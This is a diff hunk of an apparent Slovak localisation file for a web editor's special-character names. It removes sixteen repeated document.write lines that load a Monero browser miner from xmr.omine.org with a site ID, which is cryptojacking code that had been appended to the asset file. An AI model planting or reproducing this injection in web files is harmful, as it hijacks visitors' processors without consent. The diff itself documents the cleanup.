@@ -11,19 +11,3 @@ aelig:"Malé písmeno latinky æ",ccedil:"Malé písmeno latinky c s chvostom v�
 oacute:"Malé písmeno latinky o s dĺžňom",ocirc:"Malé písmeno latinky o s mäkčeňom",otilde:"Malé písmeno latinky o s tildou",ouml:"Malé písmeno latinky o s dvoma bodkami",divide:"Znak delenia",oslash:"Malé písmeno latinky o preškrtnuté",ugrave:"Malé písmeno latinky u s accentom",uacute:"Malé písmeno latinky u s dĺžňom",ucirc:"Malé písmeno latinky u s mäkčeňom",uuml:"Malé písmeno latinky u s dvoma bodkami",yacute:"Malé písmeno latinky y s dĺžňom",thorn:"Malé písmeno latinky thorn",yuml:"Malé písmeno latinky y s dvoma bodkami",
 OElig:"Veľká ligatúra latinky OE",oelig:"Malá ligatúra latinky OE",372:"Veľké písmeno latinky W s mäkčeňom",374:"Veľké písmeno latinky Y s mäkčeňom",373:"Malé písmeno latinky w s mäkčeňom",375:"Malé písmeno latinky y s mäkčeňom",sbquo:"Dolná jednoduchá 9-úvodzovka",8219:"Horná jednoduchá otočená 9-úvodzovka",bdquo:"Dolná dvojitá 9-úvodzovka",hellip:"Trojbodkový úvod",trade:"Znak ibchodnej značky",9658:"Čierny ukazovateľ smerujúci vpravo",bull:"Kruh",rarr:"Šípka vpravo",rArr:"Dvojitá šipka vpravo",
 hArr:"Dvojitá šipka vľavo a vpravo",diams:"Čierne piky",asymp:"Skoro sa rovná"});
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
